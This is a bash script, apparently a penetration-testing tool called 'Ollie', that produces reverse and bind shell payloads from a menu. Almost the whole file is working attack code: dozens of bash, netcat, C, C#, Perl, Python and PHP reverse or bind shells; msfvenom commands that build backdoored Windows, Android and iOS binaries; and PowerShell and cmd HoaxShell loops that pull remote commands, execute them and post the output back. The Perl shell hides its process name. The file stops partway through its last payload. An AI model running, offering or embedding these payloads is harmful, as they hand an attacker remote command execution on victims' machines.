#!/bin/bash
#
#
#
#
SHELLTYPE="sh"
ENCODINGMETHOD=0
#
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
NC="${C}[0m"


banner() {
echo "${RED}"
echo "############################ ${BLUE}Ollie #############################" 
echo "#							       #"
echo "#		  mmmm  \"\"#    \"\"#      \"		       #"
echo "#		 m'  'm   #      #    mmm     mmm	       #"
echo "#		 #    #   #      #      #    #\"  #	       #"
echo "#		 #    #   #      #      #    #\"\"	       #"
echo "#		  #mm#    \"mm   \"mm   mm#mm  \"#mm\"	       #"
echo "#							       #"
echo "#  ${GREEN}~ A Command Line Interface for generating Reverse Shells ~${RED}  #"
echo "# 							       #"
echo "#                	   by ${YELLOW}lf32${RED} 			       #"
echo "#                	   				       #"
echo "${BLUE}############################ ${RED}Ollie #############################" 
echo "${NC}"
}
banner


#
# Socket = IP + PORT
#
socket() {
	echo ""
	read -p "${YELLOW}Enter The IP Address ${GREEN}[Default=10.10.10.10]:${NC} " IPADDR
	[ -z "$IPADDR" ] && IPADDR="10.10.10.10"
	read -p "${YELLOW}Enter The Port Number	    ${GREEN}[Default=9001]:${NC} " PORT
	[ -z "$PORT" ] && PORT="9001"
	echo "${NC}"
}

#
# Platform
#
# Lets not focus on this for now.
#
platform() {
	echo ""
	echo "Choose The Platform You Want To Go With"
	echo -e "[1] Linux\t[2] Windows\t[3] Mac"
	read -p "Pick a number from above [Default=1]: " PLATFORM	
}


#
# Generate Shell Type
#
genShell() {
	echo ""
	echo "${YELLOW}Choose The Shell You Want To Generate${GREEN}"
	echo -e "[1] Reverse\t[2] Bind\t[3] MSFVenom\t[4] HoaxShell"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " SHELLTYPE

	case $SHELLTYPE in
		1) revPayloadShell ;;
		2) bindPayloadTools ;;
		3) msfVenomPayloadTools ;;
		4) hoaxShellPayloadTools ;;
		*) revPayloadShell ;;
	esac
}

#
# Reverse Shell
# 
# Payload Shell Type
#
revPayloadShell() {
	echo "" 
	echo -e "${RED}=============================== REVERSE SHELL ==============================="
	echo -e "${YELLOW}[SHELL]Choose The Payload Shell To Use${GREEN}"
	echo -e "[1] sh\t\t[2] /bin/sh\t[3] bash\t[4] /bin/bash\t[5] cmd"
	echo -e "[6] powershell\t[7] pwsh\t[8] ash\t\t[9] bsh\t\t[10] csh"
	echo -e "[11] ksh\t[12] zsh\t[13] pkdsh\t[14] tcsh\t[15] mksh"
	echo -e "[16] dash"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " REVSHELLTYPE
	
	possibleShells=(
		"sh"
		"/bin/sh"
		"bash"
		"/bin/bash"
		"cmd"
		"powershell"
		"pwsh"
		"ash"
		"bsh"
		"csh"
		"ksh"
		"zsh"
		"pkdsh"
		"tcsh"
		"mksh"
		"dash"
	)

	[[  $REVSHELLTYPE && $REVSHELLTYPE -gt 0 && $REVSHELLTYPE -lt "${#possibleShells[@]}" ]] && SHELLTYPE="${possibleShells[REVSHELLTYPE-1]}" || SHELLTYPE="sh"
	
	revShellPayloadEncoding
}

#
# Reverse Shell
#
# Reverse Shell Encoding Payload Type
#
revShellPayloadEncoding() {
	echo ""
	echo -e "${YELLOW}[ENCODING] Choose The Encoding Type${GREEN}"
	echo -e "[1] None\t[2] URL Encode\t[3] Double URL Encode\t[4] Base64"
	read -p "${YELLOW}Pick an Encoding Scheme from above ${GREEN}[Default=1]:${NC} " ENCODING

	case $ENCODING in
		1) ENCODINGMETHOD=0;;
		2) ENCODINGMETHOD=1;;
		3) ENCODINGMETHOD=2;;
		4) ENCODINGMETHOD=3;;
		*) ENCODINGMETHOD=0;;
	esac

	revShellPayloadTools
}


#
# ENCODING
#
#
payloadEncoder() {
    # USAGE payloadEncoder "$1"

    old_lang=$LANG
    LANG=C
    
    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LANG=$old_lang
    LC_COLLATE=$old_lc_collate
}


#
# Reverse Shell
#
# Reverse Shell Tools
#
revShellPayloadTools() {
	echo ""
	echo -e "${YELLOW}[REVERSE SHELL] Choose The Type Of Tool You Wish To Use${GREEN}"
	echo -e "[1] Bash -i\t\t[2] Bash 196\t\t[3] Bash readline"
	echo -e "[4] Bash 5\t\t[5] Bash udp\t\t[6] nc mkfifo"
	echo -e "[7] nc -e\t\t[8] BusyBox nc -e\t[9] nc -c"
	echo -e "[10] ncat -e\t\t[11] ncat udp\t\t[12] rustcat"
	echo -e "[13] C\t\t\t[14] C# TCP Client\t[15] C# Bash -i"
	echo -e "[16] Haskel #1\t\t[17] Perl\t\t[18] Perl no sh"
	echo -e "[19] Perl PentestMonkey\t[20] PHP PentestMonkey\t[21] PHP Ivan Sincek"
	echo -e "[22] PHP cmd\t\t[23] PHP cmd 2\t\t[24] PHP cmd small"
	echo -e "[25] PHP exec\t\t[26] PHP shell_exec\t[27] PHP system"
	echo -e "[28] PHP passthru\t[29] PHP \`\t\t[30] PHP popen"
	echo -e "[31] PHP proc_open\t[32] Python #1\t\t[33] Python #2"
	echo -e "[34] Python3 #1\t\t[35] Python3 #2\t\t[36] Python3 shortest"
	echo -e "[37] Ruby #1\t\t[38] Ruby no sh\t\t[39] socat #1"
	echo -e "[40] socat #2 (TTY)\t[41] node.js\t\t[42] node.js #2"
	echo -e "[43] Java #1\t\t[44] Java #2\t\t[45] Java #3"
	echo -e "[46] Java Web\t\t[47] Java Two Way\t[48] Javascript"
	echo -e "[49] telnet\t\t[50] zsh\t\t[51] Lua #1"
	echo -e "[52] Lua #2\t\t[53] GoLang\t\t[54] Vlang"
	echo -e "[55] Awk\t\t[56] Dart"
	read -p "${YELLOW}Pick a tool from above ${GREEN}[Default=1]:${NC} " REVSHELLPAYLOAD

	echo -e "\n${YELLOW}=============================== REVERSE SHELL PAYLOAD ===============================${NC}"

	echo "${revShellPayloads[$REVSHELLPAYLOAD-1]}" | xclip -sel c
	echo "${revShellPayloads[$REVSHELLPAYLOAD-1]}"
}


#
# Bind Shell
#
# Bind Shell Payload Tools
#
bindPayloadTools() {
	echo ""
	echo -e "${RED}=============================== BIND SHELL ==============================="
	echo -e "${YELLOW}[BIND SHELL] Choose A Tool You Wish To Use${GREEN}"
	echo -e "[1] Python3 Bind\t[2] PHP Bind"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " BINDSHELLPAYLOAD

	echo -e "\n${YELLOW}=============================== BIND SHELL PAYLOAD ===============================${NC}"

	case $BINDSHELLPAYLOAD in
		1) echo "${bindShellPayloads[0]}";
			echo "${bindShellPayloads[0]}" | xclip -sel c;
			exit;;
		2) echo ${bindShellPayloads[1]};
			echo "${bindShellPayloads[1]}" | xclip -sel c;
			exit;;
		*) echo ${bindShellPayloads[0]}; 
			echo "${bindShellPayloads[0]}" | xclip -sel c;
			exit;;
	esac
	
}


#
# MSFVenom
#
# MSFVenom Shell Payload Tools
#
msfVenomPayloadTools() {
	echo ""
	echo -e "${RED}=============================== BIND SHELL ==============================="
	echo -e "${YELLOW}[MSFVENOM] Choose a Tool You Wish To Use${GREEN}"
	echo "[1] Linux Meterpreter Staged Reverse TCP (x64)"
	echo "[2] Linux Stageless Reverse TCP (x64)"
	echo "[3] PHP Meterpreter Stageless Reverse TCP"
	echo "[4] PHP Reverse PHP"
	echo "[5] JSP Stageless Reverse TCP"
	echo "[6] WAR Stageless Reverse TCP"
	echo "[7] Python Stageless Reverse TCP"
	echo "[8] Bash Stageless Reverse TCP"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " MSFVENOMPAYLOAD


	echo -e "\n${YELLOW}=============================== MSFVENOM PAYLOAD ===============================${NC}"


}


#
# HoaxShell
#
# HoaxShell Payloads
#
hoaxShellPayloadTools() {
	echo ""
	echo -e "${RED}=============================== REVERSE SHELL ==============================="
	echo -e "${YELLOW}[HoaxShell] Choose a Tool You Wish To Use${GREEN}"
	echo "[1] Windows CMD cURL"
	echo "[2] PowerShell IEX"
	echo "[3] PowerShell IEX Constr Lang Mode"
	echo "[4] PowerShell Outfile"
	echo "[5] PowerShell Outfile Constr Lang Mode"
	echo "[6] Windows CMD cURL https"
	echo "[7] PowerShell IEX https"
	echo "[8] PowerShell Constr Lang Mode IEX https"
	echo "[9] PowerShell Outfile https"
	echo "[10] PowerShell Outfile Constr Lang Mode https"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " HOAXSHELLPAYLOAD


	# # Check if the input is a valid number, and set it to 1 if not
	if [[ ! "$HOAXSHELLPAYLOAD" =~ ^[0-9]+$ ]]; then
		HoaxShell="${hoaxShellPayloads[0]}"
	fi

	# Check if the input is out the range of possible shells
	if [[ "$HOAXSHELLPAYLOAD" -lt 1 || "$HOAXSHELLPAYLOAD" -gt 10 ]]; then
		HoaxShell="${hoaxShellPayloads[0]}"
	fi

	# Check if the input is within the range of possible shells
	if [[ "$HOAXSHELLPAYLOAD" -gt 0 && "$HOAXSHELLPAYLOAD" -lt 11 ]]; then
		HoaxShell="${hoaxShellPayloads[HOAXSHELLPAYLOAD-1]}"
	fi

	SHELLTYPE="${HoaxShell}"

	echo -e "\n${YELLOW}=============================== BIND SHELL PAYLOAD ===============================${NC}"
	echo -e "\n>>> Download The HoaxShell Listener at https://github.com/t3l3machus/hoaxshell/tree/main/revshells \n"

	echo $SHELLTYPE | xclip -sel c
	echo $SHELLTYPE

}


#
# Payloads
#


#
# Reverse Shell Payloads
#
revShellPayloads=(
	# Bash -i
	"${SHELLTYPE} -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1" \
	# Bash 196
	"0<&196;exec 196<>/dev/tcp/${IPADDR}/${PORT}; ${SHELLTYPE} <&196 >&196 2>&196"
	# Bash readline
	"exec 5<>/dev/tcp/${IPADDR}/${PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done" 
	# Bash 5
	"${SHELLTYPE} -i 5<> /dev/tcp/${IPADDR}/${PORT} 0<&5 1>&5 2>&5"
	# Bash udp
	"${SHELLTYPE} -i >& /dev/udp/${IPADDR}/${PORT} 0>&1"
	# nc mkfifo
	"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELLTYPE} -i 2>&1|nc ${IPADDR} ${PORT} >/tmp/f"
	# nc -e
	"nc ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# BusyBox nc -e
	"busybox nc ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# nc -c
	"nc -c ${SHELLTYPE} ${IPADDR} ${PORT}"
	# ncat -e
	"ncat ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# ncat.exe -e
	"ncat.exe ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# ncat udp
	"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELLTYPE} -i 2>&1|ncat -u ${IPADDR} ${PORT} >/tmp/f"
	# rustcat
	"rcat ${IPADDR} ${PORT} -r ${SHELLTYPE}"
	# C
	"#include <stdio.h>
	#include <sys/socket.h>
	#include <sys/types.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <netinet/in.h>
	#include <arpa/inet.h>

	int main(void){
	    int port = ${PORT};
	    struct sockaddr_in revsockaddr;

	    int sockt = socket(AF_INET, SOCK_STREAM, 0);
	    revsockaddr.sin_family = AF_INET;       
	    revsockaddr.sin_port = htons(port);
	    revsockaddr.sin_addr.s_addr = inet_addr(\"${IPADDR}\");

	    connect(sockt, (struct sockaddr *) &revsockaddr, 
	    sizeof(revsockaddr));
	    dup2(sockt, 0);
	    dup2(sockt, 1);
	    dup2(sockt, 2);

	    char * const argv[] = {\"${SHELLTYPE}\", NULL};
	    execve(\"${SHELLTYPE}\", argv, NULL);

	    return 0;       
	}"
	# C Windows
	"#include <winsock2.h>
	#include <stdio.h>
	#pragma comment(lib,\"ws2_32\")

	WSADATA wsaData;
	SOCKET Winsock;
	struct sockaddr_in hax; 
	char ip_addr[16] = \"${IPADDR}\"; 
	char port[6] = \"${PORT}\";            

	STARTUPINFO ini_processo;

	PROCESS_INFORMATION processo_info;

	int main()
	{
	    WSAStartup(MAKEWORD(2, 2), &wsaData);
	    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


	    struct hostent *host; 
	    host = gethostbyname(ip_addr);
	    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

	    hax.sin_family = AF_INET;
	    hax.sin_port = htons(atoi(port));
	    hax.sin_addr.s_addr = inet_addr(ip_addr);

	    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	    memset(&ini_processo, 0, sizeof(ini_processo));
	    ini_processo.cb = sizeof(ini_processo);
	    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
	    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

	    TCHAR cmd[255] = TEXT(\"cmd.exe\");

	    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

	    return 0;
	}"
	# C# TCP Client
	"using System;
	using System.Text;
	using System.IO;
	using System.Diagnostics;
	using System.ComponentModel;
	using System.Linq;
	using System.Net;
	using System.Net.Sockets;


	namespace ConnectBack
	{
		public class Program
		{
			static StreamWriter streamWriter;

			public static void Main(string[] args)
			{
				using(TcpClient client = new TcpClient(\"${IPADDR}\", ${PORT}))
				{
					using(Stream stream = client.GetStream())
					{
						using(StreamReader rdr = new StreamReader(stream))
						{
							streamWriter = new StreamWriter(stream);

							StringBuilder strInput = new StringBuilder();

							Process p = new Process();
							p.StartInfo.FileName = \"${SHELLTYPE}\";
							p.StartInfo.CreateNoWindow = true;
							p.StartInfo.UseShellExecute = false;
							p.StartInfo.RedirectStandardOutput = true;
							p.StartInfo.RedirectStandardInput = true;
							p.StartInfo.RedirectStandardError = true;
							p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
							p.Start();
							p.BeginOutputReadLine();

							while(true)
							{
								strInput.Append(rdr.ReadLine());
								//strInput.Append(\"\\n\");
								p.StandardInput.WriteLine(strInput);
								strInput.Remove(0, strInput.Length);
							}
						}
					}
				}
			}

			private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
	        {
	            StringBuilder strOutput = new StringBuilder();

	            if (!String.IsNullOrEmpty(outLine.Data))
	            {
	                try
	                {
	                    strOutput.Append(outLine.Data);
	                    streamWriter.WriteLine(strOutput);
	                    streamWriter.Flush();
	                }
	                catch (Exception err) { }
	            }
	        }

		}
	}"
	# C# Bash -i
	"using System;
	using System.Diagnostics;
	
	namespace BackConnect {
	  class ReverseBash {
		public static void Main(string[] args) {
		  Process proc = new System.Diagnostics.Process();
		  proc.StartInfo.FileName = \"${SHELLTYPE}\";
		  proc.StartInfo.Arguments = \"-c \"mksh -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1\\\"\";
		  proc.StartInfo.UseShellExecute = false;
		  proc.StartInfo.RedirectStandardOutput = true;
		  proc.Start();
	
		  while (!proc.StandardOutput.EndOfStream) {
			Console.WriteLine(proc.StandardOutput.ReadLine());
		  }
		}
	  }
	}"
	# Haskel #1
	"module Main where

	import System.Process

	main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | ${SHELLTYPE} -i 2>&1 | nc ${IPADDR} ${PORT} >/tmp/f\""
	# Perl
	"perl -e 'use Socket;\$i=\"${IPADDR}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"${REVSHELLTYPE} -i\");};'"
	# Perl no sh
	"perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${IPADDR}:${PORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
	# Perl PentestMonkey
	"#!/usr/bin/perl -w
	# perl-reverse-shell - A Reverse Shell implementation in PERL
	# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
	#
	# This tool may be used for legal purposes only.  Users take full responsibility
	# for any actions performed using this tool.  The author accepts no liability
	# for damage caused by this tool.  If these terms are not acceptable to you, then
	# do not use this tool.
	#
	# In all other respects the GPL version 2 applies:
	#
	# This program is free software; you can redistribute it and/or modify
	# it under the terms of the GNU General Public License version 2 as
	# published by the Free Software Foundation.
	#
	# This program is distributed in the hope that it will be useful,
	# but WITHOUT ANY WARRANTY; without even the implied warranty of
	# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	# GNU General Public License for more details.
	#
	# You should have received a copy of the GNU General Public License along
	# with this program; if not, write to the Free Software Foundation, Inc.,
	# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
	#
	# This tool may be used for legal purposes only.  Users take full responsibility
	# for any actions performed using this tool.  If these terms are not acceptable to
	# you, then do not use this tool.
	#
	# You are encouraged to send comments, improvements or suggestions to
	# me at pentestmonkey@pentestmonkey.net
	#
	# Description
	# -----------
	# This script will make an outbound TCP connection to a hardcoded IP and port.
	# The recipient will be given a shell running as the current user (apache normally).
	#

	use strict;
	use Socket;
	use FileHandle;
	use POSIX;
	my \$VERSION = \"1.0\";

	# Where to send the reverse shell.  Change these.
	my \$ip = '${IPADDR}';
	my \$port = ${PORT};

	# Options
	my \$daemon = 1;
	my \$auth   = 0; # 0 means authentication is disabled and any 
			# source IP can access the reverse shell
	my \$authorised_client_pattern = qr(^127\.0\.0\.1$);

	# Declarations
	my \$global_page = \"\";
	my \$fake_process_name = \"/usr/sbin/apache\";

	# Change the process name to be less conspicious
	\$0 = \"[httpd]\";

	# Authenticate based on source IP address if required
	if (defined(\$ENV{'REMOTE_ADDR'})) {
		cgiprint(\"Browser IP address appears to be: \$ENV{'REMOTE_ADDR'}\");

		if (\$auth) {
			unless (\$ENV{'REMOTE_ADDR'} =~ \$authorised_client_pattern) {
				cgiprint(\"ERROR: Your client isn't authorised to view this page\");
				cgiexit();
			}
		}
	} elsif (\$auth) {
		cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");
		cgiexit(0);
	}

	# Background and dissociate from parent process if required
	if (\$daemon) {
		my \$pid = fork();
		if (\$pid) {
			cgiexit(0); # parent exits
		}

		setsid();
		chdir('/');
		umask(0);
	}

	# Make TCP connection for reverse shell
	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	if (connect(SOCK, sockaddr_in(\$port,inet_aton(\$ip)))) {
		cgiprint(\"Sent reverse shell to \$ip:\$port\");
		cgiprintpage();
	} else {
		cgiprint(\"Couldn't open reverse shell to \$ip:\$port: \$!\");
		cgiexit();	
	}

	# Redirect STDIN, STDOUT and STDERR to the TCP connection
	open(STDIN, \">&SOCK\");
	open(STDOUT,\">&SOCK\");
	open(STDERR,\">&SOCK\");
	\$ENV{'HISTFILE'} = '/dev/null';
	system(\"w;uname -a;id;pwd\");
	exec({\"${SHELLTYPE}\"} (\$fake_process_name, \"-i\"));

	# Wrapper around print
	sub cgiprint {
		my \$line = shift;
		\$line .= \"<p>\\n\";
		\$global_page .= \$line;
	}

	# Wrapper around exit
	sub cgiexit {
		cgiprintpage();
		exit 0; # 0 to ensure we don't give a 500 response.
	}

	# Form HTTP response using all the messages gathered by cgiprint so far
	sub cgiprintpage {
		print \"Content-Length: \" . length(\$global_page) . \"\\r
	Connection: close\\r
	Content-Type: text\/html\\r\\n\\r\\n\" . \$global_page;
	}
	"
)


#
# Bind Shell Payloads
#
bindShellPayloads=(
	# Python3 Bind
	"python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",${PORT}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
	# PHP Bind
	"php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$s,\"0.0.0.0\",${PORT});socket_listen(\$s,1);\$cl=socket_accept(\$s);while(1){if(!socket_write(\$cl,\"\$ \",2))exit;\$in=socket_read(\$cl,100);\$cmd=popen(\"\$in\",\"r\");while(!feof(\$cmd)){\$m=fgetc(\$cmd);socket_write(\$cl,\$m,strlen(\$m));}}'"
)


#
# MSFVenom Payloads
#
msfvenomPayloads=(
	# Windows Meterpreter Staged Reverse TCP (x64)
	"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Meterpreter Stageless Reverse TCP (x64)
	"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Staged Reverse TCP (x64)
	"msfvenom -p windows/x64/shell/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Stageless Reverse TCP (x64)
	"msfvenom -p windows/x64/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f exe -o reverse.exe"
	# Windows Staged JSP Reverse TCP (x64)
	"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f jsp -o ./rev.jsp"
	# Linux Meterpreter Staged Reverse TCP (x64)
	"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f elf -o reverse.elf"
	# Linux Meterpreter Stageless Reverse TCP (x64)	
	"msfvenom -p linux/x64/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f elf -o reverse.elf"
	# Windows Bind TCP ShellCode-BOF
	"msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode"
	# macOS Meterpreter Staged Reverse TCP (x64)
	"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f macho -o shell.macho"
	# macOS Meterpreter Stageless Reverse TCP (x64)
	"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f macho -o shell.macho"
	# macOS Stageless Reverse TCP (x64)
	"msfvenom -p osx/x64/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f macho -o shell.macho"
	# PHP Meterpreter Stageless Reverse TCP
	"msfvenom -p php/meterpreter_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f raw -o shell.php"
	# PHP Reverse PHP
	"msfvenom -p php/reverse_php LHOST=${IPADDR} LPORT=${PORT} -o shell.php"
	# JSP Stageless Reverse TCP
	"msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f raw -o shell.jsp"
	# WAR Stageless Reverse TCP
	"msfvenom -p java/shell_reverse_tcp LHOST=${IPADDR} LPORT=${PORT} -f war -o shell.war"
	# Android Meterpreter Reverse TCP
	"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=${IPADDR} lport=${PORT} R -o malicious.apk"
	# Android Meterpeter Embed Reverse TCP
	"msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost=${IPADDR} lport=${PORT} -o payload.apk"
	# Apple iOS Meterpreter Reverse TCP Inline
	"msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost=${IPADDR} lport=${PORT} -f macho -o payload"
	# Python Stageless Reverse TCP
	"msfvenom -p cmd/unix/reverse_python LHOST=${IPADDR} LPORT=${PORT} -f raw"
	# Bash Stageless Reverse TCP
	"msfvenom -p cmd/unix/reverse_bash LHOST=${IPADDR} LPORT=${PORT} -f raw -o shell.sh"
)


#
# HoaxShell Payloads
#
hoaxShellPayloads=(
	# Windwos CMD cURL
	"@echo off&cmd /V:ON /C \"SET ip=${IPADDR}:${PORT}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL"
	# PowerShell IEX
	"\$s='${IPADDR}:${PORT}';\$i='14f30f27-650c00d7-fef40df7';\$p='http://';\$v=IRM -UseBasicParsing -Uri \$p\$s/14f30f27 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/650c00d7 -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=IEX \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/fef40df7 -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell IEX Constr Lang Mode
	"\$s='${IPADDR}:${PORT}';\$i='bf5e666f-5498a73c-34007c82';\$p='http://';\$v=IRM -UseBasicParsing -Uri \$p\$s/bf5e666f -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/5498a73c -Headers @{\"Authorization\"=\$i});if (\$c -ne 'None') {\$r=IEX \$c -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/34007c82 -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
	# PowerShell Outfile
	"\$s='${IPADDR}:${PORT}';\$i='add29918-6263f3e6-2f810c1e';\$p='http://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/add29918 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(Invoke-RestMethod -UseBasicParsing -Uri \$p\$s/6263f3e6 -Headers @{\"Authorization\"=\$i});if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=Invoke-RestMethod -Uri \$p\$s/2f810c1e -Method POST -Headers @{\"Authorization\"=\$i} -Body ([System.Text.Encoding]::UTF8.GetBytes(\$e+\$r) -join ' ')} sleep 0.8}"
	# PowerShell Outfile Constr Lang Mode
	"\$s='${IPADDR}:${PORT}';\$i='e030d4f6-9393dc2a-dd9e00a7';\$p='http://';\$f=\"C:Users\$env:USERNAME.localhack.ps1\";\$v=IRM -UseBasicParsing -Uri \$p\$s/e030d4f6 -Headers @{\"Authorization\"=\$i};while (\$true){\$c=(IRM -UseBasicParsing -Uri \$p\$s/9393dc2a -Headers @{\"Authorization\"=\$i}); if (\$c -eq 'exit') {del \$f;exit} elseif (\$c -ne 'None') {echo \"\$c\" | out-file -filepath \$f;\$r=powershell -ep bypass \$f -ErrorAction Stop -ErrorVariable e;\$r=Out-String -InputObject \$r;\$t=IRM -Uri \$p\$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=\$i} -Body (\$e+\$r)} sleep 0.8}"
	# Windows CMD cURL https
	"@echo off&cmd /V:ON /C \"SET ip=${IPADDR}:${PORT}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455@echo off&cmd /V:ON /C \"SET ip=${IPADDR}:${PORT}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL"
	# PowerShell IEX https
	"add-type @\"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
\"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
